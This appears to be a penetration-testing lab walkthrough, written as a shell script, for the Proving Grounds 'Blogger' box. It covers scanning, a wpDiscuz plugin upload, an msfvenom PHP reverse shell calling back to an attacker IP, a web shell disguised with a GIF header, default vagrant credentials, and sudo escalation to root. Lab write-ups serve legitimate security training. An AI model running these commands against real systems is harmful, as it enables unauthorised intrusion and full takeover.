# Create variable for target VM
TARGET_IP="192.168.200.217"
WORKING_DIR="/home/brian/Documents/ProvingGrounds/Blogger/"

# nmap
nmap $TARGET_IP -sC -sV -O -A -p 80,22 -oN scan.txt

# Add the target IP to /etc/hosts
echo "$TARGET_IP blogger.pg" | sudo tee -a /etc/hosts

# Run Ferrox Buster
feroxbuster -u http://blogger.pg

# Run WPScan
wpscan --url http://blogger.pg/assets/fonts/blog/ --enumerate p --plugins-detection aggressive
# We find that wpdiscuz is used, out of date version 7.6.15

# Create a PHP reverse shell as a GIF
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.45.229 LPORT=4444 -f raw > shell.gif
# This ended up not working, we needed to add the GIF/JPG header to a PHP reverse shell

# Create a PHP reverse shell and append the GIF header
cp /usr/share/webshells/php/php-reverse-shell.php $WORKING_DIR/php-reverse-shell.php
# Add GIF header to the beginning of php-reverse-shell.php
sed -i '1s/^/GIF89a;\n/' $WORKING_DIR/php-reverse-shell.php

# Look at the users in the /home/ folder
ls /home

# We need to upgrade the shell, trying to use su gives us an error
python3 -c 'import pty;pty.spawn("/bin/bash")'

# We look at the users, try passwords, found that vagrant:vagrant works

su vagrant
sudo -l
# We can run anything as root
sudo su

# We are now root
